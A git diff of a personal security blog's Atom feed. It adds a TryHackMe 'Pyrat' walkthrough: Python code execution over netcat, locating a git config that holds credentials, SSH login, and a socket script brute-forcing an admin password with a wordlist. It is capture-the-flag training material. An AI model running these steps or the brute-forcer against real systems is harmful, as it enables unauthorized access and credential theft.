@@ -1,4 +1,109 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-06-30T10:35:22+05:30</updated><id>http://localhost:4000/feed.xml</id><title type="html">Himangshu Pan</title><subtitle>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.</subtitle><author><name>Himangshu Pan</name></author><entry><title type="html">📁 Searching for Files in the Linux Terminal</title><link href="http://localhost:4000/blog/Searching_for_Files_in_the_Linux_Terminal/" rel="alternate" type="text/html" title="📁 Searching for Files in the Linux Terminal" /><published>2025-06-28T00:00:00+05:30</published><updated>2025-06-28T00:00:00+05:30</updated><id>http://localhost:4000/blog/filesearch</id><content type="html" xml:base="http://localhost:4000/blog/Searching_for_Files_in_the_Linux_Terminal/"><![CDATA[<h1 id="-searching-for-files-in-the-linux-terminal">📁 Searching for Files in the Linux Terminal</h1>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2025-07-26T15:18:04+05:30</updated><id>/feed.xml</id><title type="html">Himangshu Pan</title><subtitle>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.</subtitle><author><name>Himangshu Pan</name></author><entry><title type="html">THM Pytrat Workthrough</title><link href="/blog/thm_pyrat_workthrough/" rel="alternate" type="text/html" title="THM Pytrat Workthrough" /><published>2025-07-26T00:00:00+05:30</published><updated>2025-07-26T00:00:00+05:30</updated><id>/blog/thm-pyrat-workthrough</id><content type="html" xml:base="/blog/thm_pyrat_workthrough/"><![CDATA[<h1 id="tryhackme-workthrough--pyrat">TryHackMe Workthrough =&gt; Pyrat</h1>
+
+<h3 id="description">Description</h3>
+
+<p>Pyrat receives a curious response from an HTTP server, which leads to a potential Python code execution vulnerability. With a cleverly crafted payload, it is possible to gain a shell on the machine. Delving into the directories, the author uncovers a well-known folder that provides a user with access to credentials. A subsequent exploration yields valuable insights into the application’s older version. Exploring possible endpoints using a custom script, the user can discover a special endpoint and ingeniously expand their exploration by fuzzing passwords. The script unveils a password, ultimately granting access to the root.</p>
+
+<h1 id="nmap-port-scan">Nmap port scan</h1>
+
+<p>Screenshot:</p>
+
+<p><img src="/assets/images/thm/pyrat/1.png" alt="image" /></p>
+
+<p>Port ssh (22) and Hppt (8000) is open.
+Screenshot:</p>
+
+<h1 id="check-for-the-http-port-information">Check for the http port information.</h1>
+
+<p><img src="/assets/images/thm/pyrat/2.png" alt="image" /></p>
+
+<p>Basic connection ok. lets connect to port 8000 using netcat. Try to run hello world python syntax as description says there are potential python code execution vulnerability.
+Screenshot:
+<img src="/assets/images/thm/pyrat/3.png" alt="image" /></p>
+
+<p>We can execute python codes here.</p>
+
+<p>Next I will use python code execution payload further. Try to check for incomming mails.
+Screenshot:
+<img src="/assets/images/thm/pyrat/4.png" alt="image" /></p>
+
+<p>May be there is something for me in <code class="language-plaintext highlighter-rouge">think</code>. Next try to read this mail.</p>
+
+<p>Screenshot:
+<img src="/assets/images/thm/pyrat/5.png" alt="image" /></p>
+
+<p>search for git folders.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">os</span><span class="p">;</span> <span class="nf">print</span><span class="p">([</span><span class="n">r</span> <span class="k">for</span> <span class="n">r</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="n">ds</span> <span class="ow">in</span> <span class="n">os</span><span class="p">.</span><span class="nf">walk</span><span class="p">(</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">)</span> <span class="k">if</span> <span class="sh">"</span><span class="s">.git</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">d</span><span class="p">])</span>
+</code></pre></div></div>
+
+<p>Screenshot:
+<img src="/assets/images/thm/pyrat/6.png" alt="image" /></p>
+
+<p>Check git config.</p>
+
+<p><img src="/assets/images/thm/pyrat/7.png" alt="image" /></p>
+
+<p>We got username and password here. Let’s try to ssh using this credential.</p>
+
+<p>We have successfully loged in and in the home directory there is an <code class="language-plaintext highlighter-rouge">users.txt</code> file contains our first flag.</p>
+
+<h3 id="root">Root</h3>
+
+<p><img src="/assets/images/thm/pyrat/8.png" alt="image" /></p>
+
+<p>Python script to find admin password.</p>
+
+<pre><code class="language-python=">import socket
+
+
+TARGET_IP = '10.10.118.253'
+TARGET_PORT = 8000
+WORDLIST = '/usr/share/wordlists/rockyou.txt'
+
+
+with open(WORDLIST, 'r', encoding="latin-1") as f:
+    for password in f:
+        password = password.strip()
+        try:
+            s = socket.socket()
+            s.settimeout(3)
+            s.connect((TARGET_IP, TARGET_PORT))
+
+            # Send admin
+            s.sendall(b"admin\n")
+            data = s.recv(4096).decode()
+
+            # read password prompt
+            if "Password:" in data:
+                s.sendall((password + "\n").encode())
+                data = s.recv(4096).decode()
+                print(f"[TRY] Password: {password} | Response: {data.strip()}")
+
+                if "Password:" not in data:
+                    print(f"\n[SUCCESS] Password found: {password}")
+                    break
+            else:
+                print("Error: unexpected response after sending username")
+
+            s.close()
+        except Exception as e:
+            print("Error: %s " %e)
+
+</code></pre>
+
+<p>Now successfully got the admin password.
+<img src="/assets/images/thm/pyrat/9.png" alt="image" /></p>
+
+<h2 id="useful-commands">Useful commands.</h2>
+
+<ol>
+  <li><code class="language-plaintext highlighter-rouge">nmap -sS 10.10.133.11</code></li>
+  <li><code class="language-plaintext highlighter-rouge">import os; print([r for r, d, ds in os.walk('/') if ".git" in d])</code></li>
+  <li><code class="language-plaintext highlighter-rouge">print(open("/opt/dev/.git/config").read())</code></li>
+  <li><code class="language-plaintext highlighter-rouge">ssh think@10.10.118.253</code></li>
+  <li><code class="language-plaintext highlighter-rouge">nc 10.10.118.253 8000</code></li>
+</ol>]]></content><author><name>Himangshu Pan</name></author><summary type="html"><![CDATA[TryHackMe Workthrough =&gt; Pyrat]]></summary></entry><entry><title type="html">📁 Searching for Files in the Linux Terminal</title><link href="/blog/Searching_for_Files_in_the_Linux_Terminal/" rel="alternate" type="text/html" title="📁 Searching for Files in the Linux Terminal" /><published>2025-06-28T00:00:00+05:30</published><updated>2025-06-28T00:00:00+05:30</updated><id>/blog/filesearch</id><content type="html" xml:base="/blog/Searching_for_Files_in_the_Linux_Terminal/"><![CDATA[<h1 id="-searching-for-files-in-the-linux-terminal">📁 Searching for Files in the Linux Terminal</h1>
 
 <p>Just like we rely on Google to search the web, we often need similar tools to locate files within our own system — especially when we forget where they’re stored. On Linux, where everything is treated as a file (even devices and processes), having effective file search tools is crucial.</p>
 
@@ -216,7 +321,7 @@
 
 <p>Mastering these commands will significantly improve your efficiency when navigating or troubleshooting a Linux system.</p>
 
-<p>Happy searching! 🐧</p>]]></content><author><name>Himangshu Pan</name></author><summary type="html"><![CDATA[📁 Searching for Files in the Linux Terminal]]></summary></entry><entry><title type="html">🛠️ Setup Vim as a Developer-Friendly Code Editor</title><link href="http://localhost:4000/blog/Setup_Vim_as_a_Developer-Friendly_Code_Editor/" rel="alternate" type="text/html" title="🛠️ Setup Vim as a Developer-Friendly Code Editor" /><published>2025-06-26T00:00:00+05:30</published><updated>2025-06-26T00:00:00+05:30</updated><id>http://localhost:4000/blog/Setup_vim_as_a_developer_friendly_code_editor</id><content type="html" xml:base="http://localhost:4000/blog/Setup_Vim_as_a_Developer-Friendly_Code_Editor/"><![CDATA[<h1 id="setup-vim-as-a-developer-friendly-code-editor">Setup Vim as a Developer-Friendly Code Editor</h1>
+<p>Happy searching! 🐧</p>]]></content><author><name>Himangshu Pan</name></author><summary type="html"><![CDATA[📁 Searching for Files in the Linux Terminal]]></summary></entry><entry><title type="html">🛠️ Setup Vim as a Developer-Friendly Code Editor</title><link href="/blog/Setup_Vim_as_a_Developer-Friendly_Code_Editor/" rel="alternate" type="text/html" title="🛠️ Setup Vim as a Developer-Friendly Code Editor" /><published>2025-06-26T00:00:00+05:30</published><updated>2025-06-26T00:00:00+05:30</updated><id>/blog/Setup_vim_as_a_developer_friendly_code_editor</id><content type="html" xml:base="/blog/Setup_Vim_as_a_Developer-Friendly_Code_Editor/"><![CDATA[<h1 id="setup-vim-as-a-developer-friendly-code-editor">Setup Vim as a Developer-Friendly Code Editor</h1>
 
 <p>If you’re a developer aspiring to become a security researcher, using prebuilt OSINT tools is a great start. But to truly innovate—modifying existing tools or building your own—you need a powerful and efficient coding environment.</p>
 
@@ -359,7 +464,7 @@ fc-cache <span class="nt">-fv</span>
 
 <hr />
 
-<p><strong>Happy Hacking!</strong> 🐧💻🛡️</p>]]></content><author><name>Himangshu Pan</name></author><summary type="html"><![CDATA[Setup Vim as a Developer-Friendly Code Editor]]></summary></entry><entry><title type="html">🎮 Wargames → OverTheWire Bandit Series</title><link href="http://localhost:4000/blog/Wargames%E2%86%92OverTheWire_Bandit_Series_level_01/" rel="alternate" type="text/html" title="🎮 Wargames → OverTheWire Bandit Series" /><published>2025-06-26T00:00:00+05:30</published><updated>2025-06-26T00:00:00+05:30</updated><id>http://localhost:4000/blog/Wargames%E2%86%92OverTheWire_Bandit_Series</id><content type="html" xml:base="http://localhost:4000/blog/Wargames%E2%86%92OverTheWire_Bandit_Series_level_01/"><![CDATA[<h1 id="-wargames--overthewire-bandit-series-level0-1">🎮 Wargames → OverTheWire Bandit Series (Level0-1)</h1>
+<p><strong>Happy Hacking!</strong> 🐧💻🛡️</p>]]></content><author><name>Himangshu Pan</name></author><summary type="html"><![CDATA[Setup Vim as a Developer-Friendly Code Editor]]></summary></entry><entry><title type="html">🎮 Wargames → OverTheWire Bandit Series</title><link href="/blog/Wargames%E2%86%92OverTheWire_Bandit_Series_level_01/" rel="alternate" type="text/html" title="🎮 Wargames → OverTheWire Bandit Series" /><published>2025-06-26T00:00:00+05:30</published><updated>2025-06-26T00:00:00+05:30</updated><id>/blog/Wargames%E2%86%92OverTheWire_Bandit_Series</id><content type="html" xml:base="/blog/Wargames%E2%86%92OverTheWire_Bandit_Series_level_01/"><![CDATA[<h1 id="-wargames--overthewire-bandit-series-level0-1">🎮 Wargames → OverTheWire Bandit Series (Level0-1)</h1>
 
 <p>In the field of information security, theory alone isn’t enough — without hands-on practice, your knowledge has little real value.</p>
 
@@ -469,7 +574,7 @@ fc-cache <span class="nt">-fv</span>
 
 <p>Next Blog, I’ll continue to the Bandit series wargame.</p>
 
-<p><strong>Happy hacking!</strong></p>]]></content><author><name>Himangshu Pan</name></author><summary type="html"><![CDATA[🎮 Wargames → OverTheWire Bandit Series (Level0-1)]]></summary></entry><entry><title type="html">🛠️ Setting Up VMware Workstation on Ubuntu 22.04</title><link href="http://localhost:4000/blog/Setting_Up_VMware_Workstation/" rel="alternate" type="text/html" title="🛠️ Setting Up VMware Workstation on Ubuntu 22.04" /><published>2025-06-25T00:00:00+05:30</published><updated>2025-06-25T00:00:00+05:30</updated><id>http://localhost:4000/blog/Setting_Up_VMware_Workstation</id><content type="html" xml:base="http://localhost:4000/blog/Setting_Up_VMware_Workstation/"><![CDATA[<h1 id="️-setting-up-vmware-workstation-on-ubuntu-2204">🛠️ Setting Up VMware Workstation on Ubuntu 22.04</h1>
+<p><strong>Happy hacking!</strong></p>]]></content><author><name>Himangshu Pan</name></author><summary type="html"><![CDATA[🎮 Wargames → OverTheWire Bandit Series (Level0-1)]]></summary></entry><entry><title type="html">🛠️ Setting Up VMware Workstation on Ubuntu 22.04</title><link href="/blog/Setting_Up_VMware_Workstation/" rel="alternate" type="text/html" title="🛠️ Setting Up VMware Workstation on Ubuntu 22.04" /><published>2025-06-25T00:00:00+05:30</published><updated>2025-06-25T00:00:00+05:30</updated><id>/blog/Setting_Up_VMware_Workstation</id><content type="html" xml:base="/blog/Setting_Up_VMware_Workstation/"><![CDATA[<h1 id="️-setting-up-vmware-workstation-on-ubuntu-2204">🛠️ Setting Up VMware Workstation on Ubuntu 22.04</h1>
 
 <blockquote>
   <p><em>“If I had 30 minutes to cut down a tree, I’d spend the first 20 sharpening my axe.”</em> — Abraham Lincoln</p>
